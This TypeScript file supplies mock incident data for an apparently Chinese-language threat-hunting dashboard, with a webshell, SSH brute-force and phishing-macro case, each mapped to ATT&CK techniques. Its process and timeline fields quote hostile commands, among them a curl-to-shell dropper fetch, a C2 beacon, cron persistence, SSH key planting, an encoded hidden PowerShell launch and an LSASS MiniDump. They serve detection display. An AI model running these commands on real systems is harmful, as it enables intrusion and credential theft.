export type Severity = 'critical' | 'high' | 'medium' | 'low'
export type StageKey = 'initial' | 'execution' | 'persistence' | 'privesc' | 'discovery' | 'lateral' | 'c2' | 'exfil'

export const STAGES: { key: StageKey; label: string; tactic: string; color: string }[] = [
  { key: 'initial', label: '初始访问', tactic: 'TA0001', color: '#165DFF' },
  { key: 'execution', label: '执行', tactic: 'TA0002', color: '#F59E0B' },
  { key: 'persistence', label: '持久化', tactic: 'TA0003', color: '#AC0CB9' },
  { key: 'privesc', label: '权限提升', tactic: 'TA0004', color: '#D74D12' },
  { key: 'discovery', label: '侦察发现', tactic: 'TA0007', color: '#0FC6C2' },
  { key: 'lateral', label: '横向移动', tactic: 'TA0008', color: '#5344FE' },
  { key: 'c2', label: '命令控制', tactic: 'TA0011', color: '#FE445A' },
  { key: 'exfil', label: '数据外传', tactic: 'TA0010', color: '#F53F3F' },
]

export interface Proc {
  id: string
  name: string
  pid: number
  parent?: string
  user: string
  cmd: string
  sha256: string
  signer?: string
  malicious?: boolean
  suspicious?: boolean
}

export interface TimelineItem {
  id: string
  time: string
  stage: StageKey
  proc: string
  title: string
  detail: string
  technique: string
}

export interface HuntEvent {
  id: string
  title: string
  severity: Severity
  time: string
  status: '待研判' | '处置中' | '已遏制' | '已关闭'
  score: number
  summary: string
  ai: string
  procs: Proc[]
  timeline: TimelineItem[]
  iocs: { type: string; value: string }[]
  source: { label: string; sub: string }
  entry: { label: string; sub: string }
  artifact: { label: string; sub: string }
  mainPath: string[]
  aiDetail: { verdict: string; intent: string; impact: string; next: string[] }
}

export interface Host {
  id: string
  name: string
  ip: string
  os: string
  group: string
  online: boolean
  isolated: boolean
  events: HuntEvent[]
}

const webshell: HuntEvent = {
  id: 'INC-3201',
  title: 'WebShell 植入并反弹连接',
  severity: 'critical',
  time: '09:12:38',
  status: '待研判',
  score: 92,
  summary: 'nginx 工作进程派生 php-fpm 写入 /tmp/shell.php，随后 bash 下载 dropper 并与 185.66.21.9 建立外联。',
  ai: '建议先隔离受害主机并终止 bash(4412) 进程树，封禁 185.66.21.9；随后回溯 nginx access.log 中 /upload 接口的来源会话。',
  procs: [
    { id: 'p1', name: 'nginx', pid: 1021, user: 'root', cmd: 'nginx: master process /usr/sbin/nginx', sha256: '3f1a…9c2e', signer: 'Debian' },
    { id: 'p2', name: 'php-fpm', pid: 2290, parent: 'p1', user: 'www-data', cmd: 'php-fpm: pool www', sha256: '8b7d…11af', signer: 'Debian', suspicious: true },
    { id: 'p3', name: 'bash', pid: 4412, parent: 'p2', user: 'www-data', cmd: '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh | sh', sha256: 'a91e…4d70', malicious: true },
    { id: 'p4', name: 'curl', pid: 4415, parent: 'p3', user: 'www-data', cmd: 'curl -s hxxp://185.66.21.9/dropper.sh', sha256: '2c5f…e019', signer: 'Debian', suspicious: true },
    { id: 'p5', name: 'kworkerd', pid: 4433, parent: 'p3', user: 'www-data', cmd: '/tmp/.x/kworkerd -c 185.66.21.9:443', sha256: 'e44b…7a3c', malicious: true },
    { id: 'p6', name: 'crontab', pid: 4460, parent: 'p3', user: 'www-data', cmd: 'crontab -l | echo "*/5 * * * * /tmp/.x/kworkerd"', sha256: '7d02…b8a1', signer: 'Debian', suspicious: true },
  ],
  timeline: [
    { id: 't1', time: '09:12:05', stage: 'initial', proc: 'p2', title: '上传文件', detail: 'POST /upload → /tmp/shell.php 已落地', technique: 'T1190 利用面向公众的应用' },
    { id: 't2', time: '09:12:38', stage: 'execution', proc: 'p3', title: 'WebShell 执行命令', detail: '/bin/bash -c curl hxxp://185.x.x.x/dropper.sh', technique: 'T1059.004 Unix Shell' },
    { id: 't3', time: '09:12:41', stage: 'execution', proc: 'p4', title: '下载载荷', detail: 'curl 拉取 dropper.sh (12.4KB)', technique: 'T1105 入口工具传输' },
    { id: 't4', time: '09:13:02', stage: 'persistence', proc: 'p6', title: '写入计划任务', detail: '*/5 * * * * /tmp/.x/kworkerd', technique: 'T1053.003 Cron' },
    { id: 't5', time: '09:16:20', stage: 'c2', proc: 'p5', title: '异常外联', detail: '与 185.66.21.9:443 建立长连接', technique: 'T1071 应用层协议' },
    { id: 't6', time: '09:17:44', stage: 'exfil', proc: 'p5', title: '数据外传', detail: '上行 38.2MB，疑似打包 /var/www', technique: 'T1041 通过 C2 通道外传' },
  ],
  iocs: [
    { type: 'IP', value: '185.66.21.9' },
    { type: '文件', value: '/tmp/shell.php' },
    { type: '文件', value: '/tmp/.x/kworkerd' },
    { type: 'URL', value: 'hxxp://185.66.21.9/dropper.sh' },
  ],
  source: { label: '攻击源', sub: '43.21.88.17' },
  entry: { label: 'WebShell 上传', sub: 'POST /upload' },
  artifact: { label: 'kworkerd', sub: '/tmp/.x/kworkerd' },
  mainPath: ['p1', 'p2', 'p3', 'p5'],
  aiDetail: {
    verdict: '确认入侵',
    intent: '攻击者利用上传接口植入 WebShell，获取 www-data 执行权限后拉取挖矿/远控载荷 kworkerd，并通过 cron 每 5 分钟拉起实现持久化，最终经 C2 通道外传站点数据。',
    impact: '已确认 38.2MB 数据外传，涉及 /var/www 目录；当前权限为 www-data，尚未发现提权迹象。同网段 2 台主机曾访问 185.66.21.9，存在横向风险。',
    next: ['回溯 nginx access.log 中 /upload 请求的来源 IP 与会话', '检查 /var/www 下其他新增或修改的 .php 文件', '全网检索 kworkerd 哈希与 185.66.21.9 的访问记录'],
  },
}

const brute: HuntEvent = {
  id: 'INC-3190',
  title: 'SSH 暴力破解后登录',
  severity: 'high',
  time: '08:41:10',
  status: '处置中',
  score: 78,
  summary: '来自 43.21.88.17 的 1,204 次失败尝试后 admin 登录成功，并执行账户与网络侦察。',
  ai: '建议封禁来源 IP，重置 admin 凭据并检查 authorized_keys 是否被篡改。',
  procs: [
    { id: 'q1', name: 'sshd', pid: 812, user: 'root', cmd: '/usr/sbin/sshd -D', sha256: '19ab…c3d0', signer: 'Debian' },
    { id: 'q2', name: 'sshd', pid: 3310, parent: 'q1', user: 'admin', cmd: 'sshd: admin@pts/1', sha256: '19ab…c3d0', signer: 'Debian', suspicious: true },
    { id: 'q3', name: 'bash', pid: 3318, parent: 'q2', user: 'admin', cmd: '-bash', sha256: 'a91e…4d70', signer: 'Debian' },
    { id: 'q4', name: 'cat', pid: 3340, parent: 'q3', user: 'admin', cmd: 'cat /etc/passwd', sha256: '0b1c…aa20', signer: 'Debian', suspicious: true },
    { id: 'q5', name: 'tee', pid: 3361, parent: 'q3', user: 'admin', cmd: 'tee -a ~/.ssh/authorized_keys', sha256: '55e1…0f9b', signer: 'Debian', malicious: true },
  ],
  timeline: [
    { id: 'u1', time: '08:40:58', stage: 'initial', proc: 'q2', title: '暴力破解成功', detail: '1,204 次失败后 admin 登录成功', technique: 'T1110.001 密码猜测' },
    { id: 'u2', time: '08:41:30', stage: 'discovery', proc: 'q4', title: '账户侦察', detail: 'cat /etc/passwd', technique: 'T1087 账户发现' },
    { id: 'u3', time: '08:42:12', stage: 'persistence', proc: 'q5', title: '植入 SSH 公钥', detail: '向 authorized_keys 追加未知公钥', technique: 'T1098.004 SSH 授权密钥' },
  ],
  iocs: [{ type: 'IP', value: '43.21.88.17' }],
  source: { label: '攻击源', sub: '43.21.88.17' },
  entry: { label: '弱口令登录', sub: 'SSH :22' },
  artifact: { label: 'authorized_keys', sub: '~/.ssh/authorized_keys' },
  mainPath: ['q1', 'q2', 'q3', 'q5'],
  aiDetail: {
    verdict: '高度可疑',
    intent: '攻击者通过字典爆破获得 admin 口令，登录后进行账户侦察并写入 SSH 公钥以保留长期访问能力。',
    impact: 'admin 具备 sudo 权限，若未清除公钥，攻击者可绕过口令重置继续登录。',
    next: ['核对 authorized_keys 中新增公钥的指纹', '检查 admin 近 7 天的 sudo 记录', '确认 43.21.88.17 是否尝试登录其他主机'],
  },
}

const script: HuntEvent = {
  id: 'INC-3191',
  title: '异常 PowerShell 编码执行',
  severity: 'high',
  time: '09:12:01',
  status: '待研判',
  score: 81,
  summary: 'Office 宏派生 powershell -enc，加载内存载荷并尝试凭据转储。',
  ai: '建议立即终止 powershell(6620) 进程树，隔离文件 invoice.docm，并对域内凭据进行轮换。',
  procs: [
    { id: 'r1', name: 'WINWORD.EXE', pid: 5120, user: 'CORP\\liwei', cmd: 'WINWORD.EXE /n invoice.docm', sha256: 'c0de…31f2', signer: 'Microsoft' },
    { id: 'r2', name: 'powershell.exe', pid: 6620, parent: 'r1', user: 'CORP\\liwei', cmd: 'powershell -nop -w hidden -enc SQBFAFgA…', sha256: '9d4c…72ab', signer: 'Microsoft', malicious: true },
    { id: 'r3', name: 'rundll32.exe', pid: 6702, parent: 'r2', user: 'CORP\\liwei', cmd: 'rundll32 comsvcs.dll MiniDump 664 lsass.dmp full', sha256: 'aa18…e5c1', signer: 'Microsoft', malicious: true },
    { id: 'r4', name: 'net.exe', pid: 6731, parent: 'r2', user: 'CORP\\liwei', cmd: 'net group "Domain Admins" /domain', sha256: '4a2b…0091', signer: 'Microsoft', suspicious: true },
  ],
  timeline: [
    { id: 'v1', time: '09:11:47', stage: 'initial', proc: 'r1', title: '打开恶意文档', detail: 'invoice.docm 来自邮件附件', technique: 'T1566.001 鱼叉附件' },
    { id: 'v2', time: '09:12:01', stage: 'execution', proc: 'r2', title: '编码命令执行', detail: 'powershell -enc (解码: IEX DownloadString)', technique: 'T1059.001 PowerShell' },
    { id: 'v3', time: '09:12:30', stage: 'privesc', proc: 'r3', title: '转储 LSASS', detail: 'comsvcs.dll MiniDump → lsass.dmp', technique: 'T1003.001 LSASS 内存' },
    { id: 'v4', time: '09:12:52', stage: 'discovery', proc: 'r4', title: '域管理员枚举', detail: 'net group "Domain Admins" /domain', technique: 'T1069.002 域组发现' },
  ],
  iocs: [{ type: '文件', value: 'invoice.docm' }, { type: '哈希', value: '9d4c…72ab' }],
  source: { label: '钓鱼邮件', sub: 'billing@inv-cn.top' },
  entry: { label: '恶意附件', sub: 'invoice.docm' },
  artifact: { label: 'lsass.dmp', sub: '凭据转储文件' },
  mainPath: ['r1', 'r2', 'r3'],
  aiDetail: {
    verdict: '确认入侵',
    intent: '钓鱼邮件附件宏启动隐藏 PowerShell，内存加载载荷后转储 LSASS 获取凭据，并枚举域管理员组为横向移动做准备。',
    impact: 'liwei 账户及该主机缓存的域凭据可能已泄露；尚未观察到横向登录。',
    next: ['确认 lsass.dmp 是否被外传', '轮换 liwei 及缓存域账户的口令', '检索同一发件人投递的其他邮件'],
  },
}

export const HOSTS: Host[] = [
  { id: 'h1', name: 'server-01', ip: '10.10.2.18', os: 'Ubuntu 22.04', group: '生产 / Web', online: true, isolated: false, events: [webshell, { ...webshell, id: 'INC-3202', title: '可疑进程持续外联', severity: 'high', timeline: webshell.timeline.filter(t => t.proc === 'p5') }, { ...brute, id: 'INC-3185', time: '07:02:44', severity: 'medium', status: '已遏制', score: 54 }] },
  { id: 'h2', name: 'DM-Master-01', ip: '10.10.8.3', os: 'Windows Server 2019', group: '内网 / 安全设备', online: true, isolated: false, events: [script] },
  { id: 'h3', name: 'bastion-02', ip: '10.10.1.5', os: 'CentOS 7.9', group: '运维 / 堡垒机', online: false, isolated: false, events: [brute] },
  { id: 'h4', name: 'db-mysql-03', ip: '10.10.4.21', os: 'Rocky 9', group: '生产 / 数据库', online: false, isolated: false, events: [] },
]
